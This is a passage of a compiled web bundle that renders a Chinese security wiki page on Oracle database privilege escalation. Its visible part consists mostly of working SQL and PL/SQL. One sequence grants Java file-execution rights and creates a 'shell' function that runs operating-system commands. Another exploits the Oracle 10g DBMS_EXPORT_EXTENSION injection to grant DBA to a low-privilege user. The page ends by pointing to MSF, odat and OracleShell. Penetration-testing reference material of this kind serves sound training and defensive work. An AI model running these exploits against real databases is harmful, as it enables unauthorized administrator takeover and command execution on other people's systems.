"),Object(s.b)("p",null,"3、使用JAVA获取权限"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"select")," dbms_xmlquery",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"newcontext",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''begin dbms_java.grant_permission( ''''SYSTEM'''', ''''SYS:java.io.FilePermission'''', ''''<<ALL FILES>>'''',''''EXECUTE'''');end;''commit;end;'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"from")," dual",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")))),Object(s.b)("p",null,"4、创建执行命令的函数select "),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),"dbms_xmlquery",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"newcontext",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function shell(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"from")," dual",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")))),Object(s.b)("p",null,"5、执行命令"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"SQL"),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"select")," shell",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'whoami'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"from")," dual",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";")))),Object(s.b)("h3",{className:"__internal",id:"三、oracle-10g-经典漏洞提权"},"三、Oracle 10g 经典漏洞提权",Object(s.b)("a",b({parentName:"h3"},{href:"#%E4%B8%89%E3%80%81oracle-10g-%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83","aria-hidden":!0,className:"anchor"}),"#")),Object(s.b)("blockquote",null,Object(s.b)("p",{parentName:"blockquote"},Object(s.b)("strong",{parentName:"p"},Object(s.b)("inlineCode",{parentName:"strong"},"oracle < 10.2.0.4"),"的版本有此漏洞")),Object(s.b)("p",{parentName:"blockquote"},"在 Oracle 10g 中，GET_DOMAIN_INDEX_TABLES 函数存在注入漏洞"),Object(s.b)("p",{parentName:"blockquote"},"该函数位于 DBMS_EXPORT_EXTENSION 包中，执行权限隶属于 sys。")),Object(s.b)("p",null,"假设",Object(s.b)("strong",{parentName:"p"},"test"),"是一个只有CONNECT和RESOURCE两个权限较低的角色"),Object(s.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(s.b)("pre",b({parentName:"div"},{className:"language-sql"}),Object(s.b)("code",b({parentName:"pre"},{className:"language-sql"}),Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"select")," ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"*")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"from")," user_role_privs",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"    ",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--首先，查询用户权限配置"),"\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--创建程序包"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"Create")," ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"or")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"REPLACE"),"\nPACKAGE HACKERPACKAGE AUTHID ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"CURRENT_USER"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"IS"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"FUNCTION")," ODCIIndexGetMetadata ",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),"oindexinfo SYS",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"odciindexinfo",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),"P3 VARCHAR2",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),"p4 VARCHAR2",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),"env\nSYS",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"odcienv",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"RETURN")," NUMBER",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"END"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"/"),"\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--创建程序包体"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"Create")," ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"or")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"REPLACE")," PACKAGE BODY HACKERPACKAGE\n",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"IS"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"FUNCTION")," ODCIIndexGetMetadata ",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),"oindexinfo SYS",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"odciindexinfo",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),"P3 VARCHAR2",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),"p4 VARCHAR2",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),"env\nSYS",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"odcienv",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"RETURN")," NUMBER\n",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"IS"),"\npragma autonomous_transaction",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"BEGIN"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"EXECUTE")," IMMEDIATE ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'GRANT DBA TO test'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"COMMIT"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"RETURN"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"1"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"END"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"END"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"/"),"\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--创建过程"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"DECLARE"),"\nINDEX_NAME VARCHAR2",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"200"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\nINDEX_SCHEMA VARCHAR2",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"200"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\nTYPE_NAME VARCHAR2",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"200"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\nTYPE_SCHEMA VARCHAR2",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"200"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\nVERSION VARCHAR2",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"200"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\nNEWBLOCK PLS_INTEGER",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\nGMFLAGS NUMBER",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\nv_Return VARCHAR2",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"200"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"BEGIN"),"\nINDEX_NAME :",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"=")," ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'A1'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\nINDEX_SCHEMA :",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"=")," ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'test'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\nTYPE_NAME :",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"=")," ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'HACKERPACKAGE'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\nTYPE_SCHEMA :",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"=")," ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'SCOTT'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\nVERSION :",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"=")," ",Object(s.b)("span",b({parentName:"code"},{className:"token string"}),"'10.2.0.1.0'"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\nGMFLAGS :",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"=")," ",Object(s.b)("span",b({parentName:"code"},{className:"token number"}),"1"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\nv_Return :",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"=")," SYS",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"DBMS_EXPORT_EXTENSION",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"."),"GET_DOMAIN_INDEX_METADATA",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),"("),"INDEX_NAME ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"="),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">"),"\nINDEX_NAME",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),"\nINDEX_SCHEMA",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"="),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">")," INDEX_SCHEMA",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),"\nTYPE_NAME ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"="),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">")," TYPE_NAME",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),"\nTYPE_SCHEMA ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"="),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">")," TYPE_SCHEMA",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),"\nVERSION ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"="),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">")," VERSION",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),"\nNEWBLOCK ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"="),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">")," NEWBLOCK",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),","),"\nGMFLAGS ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"="),Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),">")," GMFLAGS",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),")"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"END"),Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"\n",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"/"),"\n\n",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"select")," ",Object(s.b)("span",b({parentName:"code"},{className:"token operator"}),"*")," ",Object(s.b)("span",b({parentName:"code"},{className:"token keyword"}),"from")," user_role_privs",Object(s.b)("span",b({parentName:"code"},{className:"token punctuation"}),";"),"    ",Object(s.b)("span",b({parentName:"code"},{className:"token comment"}),"--最后，查询用户权限配置")))),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"利用工具提权")),Object(s.b)("p",null,Object(s.b)("strong",{parentName:"p"},"利用MSF、",Object(s.b)("a",b({parentName:"strong"},{href:"https://github.com/quentinhardy/odat",target:"_blank"}),"odat"),"、",Object(s.b)("a",b({parentName:"strong"},{href:"https://github.com/jas502n/oracleShell",target:"_blank"}),"OracleShell.jar")),"等工具也可以实现提权"))}d.isMDXComponent=!0,d=Object(c.hot)(e)(d),(p="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.default:void 0)&&(p.register(m,"makeShortcode","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\to-root.md"),p.register(l,"layoutProps","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\to-root.md"),p.register(N,"MDXLayout","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\to-root.md"),p.register(d,"MDXContent","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\to-root.md")),(r="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.leaveModule:void 0)&&r(e)}.call(this,t(23)(e))}}]);